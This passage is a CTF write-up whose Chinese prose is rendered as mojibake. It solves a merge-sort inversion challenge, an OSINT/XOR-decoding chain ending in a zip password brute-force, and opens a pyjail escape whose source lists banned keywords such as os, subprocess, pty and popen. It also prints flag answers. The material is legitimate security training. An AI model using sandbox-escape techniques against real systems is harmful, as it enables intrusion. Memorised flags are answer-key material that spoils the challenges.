<strong>å¹¶å½’æ’åºçš„è¿‡ç¨‹ï¼š</strong></p><p>Divide å°†nä¸ªå…ƒç´ åˆ†æˆä¸¤ä¸ªåŒ…å«n/2ä¸ªå…ƒç´ çš„çš„å­åºåˆ—<br>Conquer ç”¨å¹¶å½’æ’åºå¯¹ä¸¤ä¸ªå­åºåˆ—è¿›è¡Œæ’åº<br>Merge å°†ä¸¤ä¸ªå·²æ’åºçš„å­åºåˆ—åˆå¹¶å¾—åˆ°ç»“æœ</p></blockquote><p>C++ å®ç°ï¼š</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fstream&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> MAXN <span class="token operator">=</span> <span class="token number">1e7</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span> A<span class="token punctuation">[</span>MAXN<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> T<span class="token punctuation">[</span>MAXN<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">Merge</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> mid<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> a<span class="token punctuation">;</span>       <span class="token comment">//iä¸ºç¬¬ä¸€ä¸ªåºåˆ—çš„ç´¢å¼•</span>    <span class="token keyword">int</span> j <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//jä¸ºç¬¬ä¸€ä¸ªåºåˆ—çš„ç´¢å¼•</span>    <span class="token keyword">int</span> k <span class="token operator">=</span> a<span class="token punctuation">;</span>       <span class="token comment">//kä¸ºåˆå¹¶ååºåˆ—çš„ç´¢å¼•</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> mid <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> b<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            T<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                T<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                count <span class="token operator">+=</span> j <span class="token operator">-</span> k<span class="token punctuation">;</span> <span class="token comment">//ç§»åŠ¨ä¸€ä¸ªå…ƒç´ åæ¶ˆé™¤çš„é€†åºæ•°</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">//æ­¤æ—¶ä¸¤ä¸ªå­åºåˆ—å·²ç»æœ‰ä¸€ä¸ªå®Œå…¨è¢«åˆå¹¶ æŠŠå¦ä¸€ä¸ªåºåˆ—çš„å‰©ä½™å…ƒç´ åˆå¹¶</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        T<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> b<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        T<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//å°†åˆå¹¶åçš„æ•°ç»„å¤åˆ¶åˆ°åŸæ•°ç»„</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> a<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> b<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> T<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> count<span class="token punctuation">;</span> <span class="token comment">//è¿”å›æ­¤æ¬¡åˆå¹¶çš„é€†åºæ•°</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">MergeSort</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;</span> b<span class="token punctuation">)</span> <span class="token comment">//åˆ¤å®šåºåˆ—é•¿åº¦æ˜¯å¦å¤§äº1ï¼Œä¸åˆ¤å®šä¼šé€ æˆæ— é™å¾ªç¯</span>    <span class="token punctuation">{</span>        <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        count <span class="token operator">+=</span> <span class="token function">MergeSort</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>        count <span class="token operator">+=</span> <span class="token function">MergeSort</span><span class="token punctuation">(</span>mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>        count <span class="token operator">+=</span> <span class="token function">Merge</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> count<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    fstream <span class="token function">file</span><span class="token punctuation">(</span><span class="token string">"./input.txt"</span><span class="token punctuation">,</span> ios<span class="token operator">::</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"exception!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>file <span class="token operator">&gt;&gt;</span> s<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        A<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    count <span class="token operator">=</span> <span class="token function">MergeSort</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%u\n"</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ä¸ºäº†æ–¹ä¾¿ï¼Œç§»æ¤åˆ°äº† Python ä¸Šè¿›è¡Œäº¤äº’ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">###### level 2 #######</span>A <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">10000</span>T <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">10000</span><span class="token keyword">def</span> <span class="token function">Merge</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    i <span class="token operator">=</span> a    j <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    k <span class="token operator">=</span> a    <span class="token keyword">while</span> i <span class="token operator">&lt;=</span> mid <span class="token keyword">and</span> j <span class="token operator">&lt;=</span> b<span class="token punctuation">:</span>        <span class="token keyword">if</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            T<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            i <span class="token operator">+=</span> <span class="token number">1</span>            k <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                T<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>j<span class="token punctuation">]</span>                j <span class="token operator">+=</span> <span class="token number">1</span>                k <span class="token operator">+=</span> <span class="token number">1</span>                count <span class="token operator">+=</span> j <span class="token operator">-</span> k  <span class="token comment"># ç§»åŠ¨ä¸€ä¸ªå…ƒç´ åæ¶ˆé™¤çš„é€†åºæ•°</span>    <span class="token comment"># æ­¤æ—¶ä¸¤ä¸ªå­åºåˆ—å·²ç»æœ‰ä¸€ä¸ªå®Œå…¨è¢«åˆå¹¶ æŠŠå¦ä¸€ä¸ªåºåˆ—çš„å‰©ä½™å…ƒç´ åˆå¹¶</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;=</span> mid<span class="token punctuation">:</span>        T<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        i <span class="token operator">+=</span> <span class="token number">1</span>        k <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">while</span> j <span class="token operator">&lt;=</span> b<span class="token punctuation">:</span>        T<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>j<span class="token punctuation">]</span>        j <span class="token operator">+=</span> <span class="token number">1</span>        k <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token comment"># å°†åˆå¹¶åçš„æ•°ç»„å¤åˆ¶åˆ°åŸæ•°ç»„</span>    A<span class="token punctuation">[</span>a<span class="token punctuation">:</span>b<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> T<span class="token punctuation">[</span>a<span class="token punctuation">:</span>b<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> count  <span class="token comment"># è¿”å›æ­¤æ¬¡åˆå¹¶çš„é€†åºæ•°</span><span class="token comment"># level 2 : merge sort, give me the count of inversions</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+++++++++ Level 2 ++++++++\n'</span><span class="token punctuation">)</span>cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'level'</span> <span class="token keyword">in</span> r<span class="token punctuation">:</span>        <span class="token keyword">break</span>    data <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'(\[.+\])'</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    x <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-----&gt;'</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span>    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    A <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">10000</span>    T <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">10000</span>    A<span class="token punctuation">[</span><span class="token punctuation">:</span>length<span class="token punctuation">]</span> <span class="token operator">=</span> x    num <span class="token operator">=</span> MergeSort<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'=====&gt;'</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'&gt; '</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>    cnt <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'~~~'</span><span class="token punctuation">,</span> cnt<span class="token punctuation">,</span> <span class="token string">'~~~'</span><span class="token punctuation">)</span>  <span class="token comment"># 25</span><span class="token comment"># b"you won here's your flag flag{g077a_0pt1m1ze_3m_@ll}\n"</span></code></pre><p>25æ¬¡äº¤äº’ä¹‹åæ‹¿åˆ° flagã€‚</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210125004415945.png" alt="flag"></p><p><code>flag{g077a_0pt1m1ze_3m_@ll}</code></p><h3 id="0x414141"><a href="#0x414141" class="headerlink" title="0x414141"></a>0x414141</h3><blockquote><p>I think offshift promised to opensource some of their code</p></blockquote><p>é‚£å°±å» GitHub ä¸Šæœ <code>offshift</code> å¥½äº†ï¼Œäºæ˜¯æ‰¾åˆ°äº†ä¸€ä¸ªä»“åº“ã€‚</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210125004748284.png" alt="GitHub commit"></p><p>å‘ç°åˆ é™¤äº†ä¸€ä¸ª <code>script.cpython-38.pyc</code>ï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹å§ã€‚</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210125014140680.png" alt="commit"></p><p>åœ¨çº¿é‚£ä¸ªåç¼–è¯‘ä¸å¤§æˆåŠŸï¼Œå¹²è„†ç›´æ¥æœ¬åœ°åç¼–è¯‘ä¸€ä¸‹ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">uncompyle6 -o scripy.py script.cpython-38.pyc</code></pre><p>å¾—åˆ°</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64secret <span class="token operator">=</span> <span class="token string">'https://google.com'</span>cipher2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'NDE='</span><span class="token punctuation">,</span> <span class="token string">b'NTM='</span><span class="token punctuation">,</span> <span class="token string">b'NTM='</span><span class="token punctuation">,</span> <span class="token string">b'NDk='</span><span class="token punctuation">,</span> <span class="token string">b'NTA='</span><span class="token punctuation">,</span> <span class="token string">b'MTIz'</span><span class="token punctuation">,</span> <span class="token string">b'MTEw'</span><span class="token punctuation">,</span> <span class="token string">b'MTEw'</span><span class="token punctuation">,</span> <span class="token string">b'MzI='</span><span class="token punctuation">,</span> <span class="token string">b'NTE='</span><span class="token punctuation">,</span> <span class="token string">b'MzQ='</span><span class="token punctuation">,</span>           <span class="token string">b'NDE='</span><span class="token punctuation">,</span> <span class="token string">b'NDA='</span><span class="token punctuation">,</span> <span class="token string">b'NTU='</span><span class="token punctuation">,</span> <span class="token string">b'MzY='</span><span class="token punctuation">,</span> <span class="token string">b'MTEx'</span><span class="token punctuation">,</span> <span class="token string">b'NDA='</span><span class="token punctuation">,</span> <span class="token string">b'NTA='</span><span class="token punctuation">,</span> <span class="token string">b'MTEw'</span><span class="token punctuation">,</span> <span class="token string">b'NDY='</span><span class="token punctuation">,</span> <span class="token string">b'MTI='</span><span class="token punctuation">,</span> <span class="token string">b'NDU='</span><span class="token punctuation">,</span> <span class="token string">b'MTE2'</span><span class="token punctuation">,</span> <span class="token string">b'MTIw'</span><span class="token punctuation">]</span>cipher1 <span class="token operator">=</span> <span class="token punctuation">[</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> secret<span class="token punctuation">]</span></code></pre><p>æŠŠ <code>cipher1</code> æ‰“å°å‡ºæ¥ï¼Œå‘ç°ä¸å¯¹ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token string">b'NDE='</span><span class="token punctuation">,</span> <span class="token string">b'NTM='</span><span class="token punctuation">,</span> <span class="token string">b'NTM='</span><span class="token punctuation">,</span> <span class="token string">b'NDk='</span><span class="token punctuation">,</span> <span class="token string">b'NTA='</span><span class="token punctuation">,</span> <span class="token string">b'MTIz'</span><span class="token punctuation">,</span> <span class="token string">b'MTEw'</span><span class="token punctuation">,</span> <span class="token string">b'MTEw'</span><span class="token punctuation">,</span> <span class="token string">b'Mzg='</span><span class="token punctuation">,</span> <span class="token string">b'NDY='</span><span class="token punctuation">,</span> <span class="token string">b'NDY='</span><span class="token punctuation">,</span> <span class="token string">b'Mzg='</span><span class="token punctuation">,</span> <span class="token string">b'NDU='</span><span class="token punctuation">,</span> <span class="token string">b'MzY='</span><span class="token punctuation">,</span> <span class="token string">b'MTEx'</span><span class="token punctuation">,</span> <span class="token string">b'MzQ='</span><span class="token punctuation">,</span> <span class="token string">b'NDY='</span><span class="token punctuation">,</span> <span class="token string">b'NDQ='</span><span class="token punctuation">]</span></code></pre><p>ç„¶åæƒ³åˆ°æŒ‰ç…§ <code>cipher1</code> çš„é€»è¾‘é€†å‘å›å»è§£ <code>cipher2</code></p><pre class="language-python" data-language="python"><code class="language-python">l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> cipher2<span class="token punctuation">]</span>s <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment"># https://archive.is/oMl59</span></code></pre><p>è®¿é—®è¿™ä¸ª archive ç½‘ç«™ã€‚</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210125013748865.png" alt="archive"></p><p>å‘ç°äº†ä¸€ä¸ª PDF æ–‡ä»¶</p><pre class="language-none"><code class="language-none">super secret random filehttps://mega.nz/file/AAdDyIoB#gpj5s9N9-VnbNhSdkJ24Yyq3BWSYimoxanP-p03gQWs</code></pre><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210125013820898.png" alt="PDF"></p><p><code>smashing.pdf</code></p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210125015739155.png" alt="smashing.pdf"></p><p>å‘ç°å‰å‡ ä½å’Œ 65 å¼‚æˆ–ä¸€ä¸‹ï¼Œæ­£å¥½å°±æ˜¯ <code>%PDF</code>ï¼Œå°±æ˜¯ PDF çš„æ–‡ä»¶å¤´ï¼Œäºæ˜¯å†™ä¸ªè„šæœ¬å¤„ç†ä¸€ä¸‹ã€‚</p><p><strong><em>ï¼ˆå‹æƒ…æé†’ï¼Œè¿™é‡Œæœ‰å‘ï¼Œå¯ä»¥è·³è¿‡è¿™å‡ æ®µï¼‰</em></strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./smashing.pdf'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    content <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">:</span>    s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i <span class="token operator">^</span> <span class="token number">65</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./smashing_fix.pdf'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fout<span class="token punctuation">:</span>    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°çš„æ–‡ä»¶ï¼Œå‘ç°æ‰“å¼€ä¸€ç‰‡ç©ºç™½ã€‚</p><p>å†çœ‹ hexï¼Œåœ¨æ–‡ä»¶ç»“å°¾å‘ç°äº†ç†Ÿæ‚‰çš„å‹ç¼©åŒ…ã€‚</p><p>è€Œä¸”å¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰ä¸ª <code>flag.txt</code></p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210125015921598.png" alt="PK"></p><p>æå–å‡ºæ¥ï¼Œå‘ç°æ–‡ä»¶æŸåï¼Œæ‰“ä¸å¼€ã€‚æ¯”å¯¹äº†ä¸€ä¸‹æ­£å¸¸çš„å‹ç¼©åŒ…ï¼Œè¿™æ”¹çš„ä¹Ÿå¤ªå¤šäº†å§ã€‚</p><p><strong>å•Šå•Šå•Šå•Šå•Šï¼Œä¸ºä»€ä¹ˆå•Šï¼Œä¸å¯¹åŠ²ï¼</strong></p><p>çªç„¶ï¼Œå‘ç°æ–‡ä»¶å¤§å°æ€ä¹ˆä¸ä¸€æ ·ï¼Œä¿å­˜å‡ºæ¥çš„æ–‡ä»¶å¤§äº†è®¸å¤šã€‚</p><p>å†å›å»çœ‹ python è„šæœ¬ï¼Œåœ¨è¿›è¡Œ <code>s.encode()</code> ä¹‹åé•¿åº¦å˜å¤§äº†ã€‚çœ‹æ¥ç¼–ç è¿™é‡Œé¢æœ‰é—®é¢˜ã€‚</p><p><strong>å¾—æŒ‰ç…§ byte æ¥é€ä½å¼‚æˆ–æ‰è¡Œã€‚</strong></p><p>äºæ˜¯é‡å†™äº†ä¸€ä¸‹è„šæœ¬ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./smashing.pdf'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    content <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">:</span>    parts<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i <span class="token operator">^</span> <span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./smashing_fix.pdf'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fout<span class="token punctuation">:</span>    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>x<span class="token punctuation">)</span></code></pre><p>æˆ–è€…ï¼Œç”¨ <code>bytearray</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Or</span>parts <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">:</span>    parts<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i <span class="token operator">^</span> <span class="token number">65</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./smashing_fix1.pdf'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fout<span class="token punctuation">:</span>    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>parts<span class="token punctuation">)</span></code></pre><p>å¥½å‘å•Šï¼</p><p>å†æ‰“å¼€æ¥çœ‹ï¼Œè¿™å°±å¯¹äº†å˜›ï¼Bitcoin è®²ç©¶ã€‚</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210126170726631.png" alt="pdf"></p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210126170737920.png" alt="zip"></p><p>zip æš´åŠ›ç ´è§£ä¸€ä¸‹å¯†ç ï¼Œä¸º <code>passwd</code>ã€‚</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210126170800276.png" alt="passwd"></p><p>è§£å‹å¾—åˆ° flag</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210126170844371.png" alt="flag"></p><p><code>flag{1t_b33n_A_l0ng_w@y8742}</code></p><p>å–µå‘œï¼Œè€å¥—å¨ƒäº†ï¼</p><h3 id="pyjail"><a href="#pyjail" class="headerlink" title="pyjail"></a>pyjail</h3><blockquote><p>Escape me plz. </p><p>EU instance: 207.180.200.166 1024 </p><p>US instance: 45.134.3.200 1024</p></blockquote><p>æºç å¦‚ä¸‹ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> re<span class="token keyword">from</span> sys <span class="token keyword">import</span> modules<span class="token punctuation">,</span> versionbanned <span class="token operator">=</span> <span class="token string">"import|chr|os|sys|system|builtin|exec|eval|subprocess|pty|popen|read|get_data"</span>search_func <span class="token operator">=</span> <span class="token keyword">lambda</span> word<span class="token punctuation">:</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"\b({0})\b"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>IGNORECASE<span 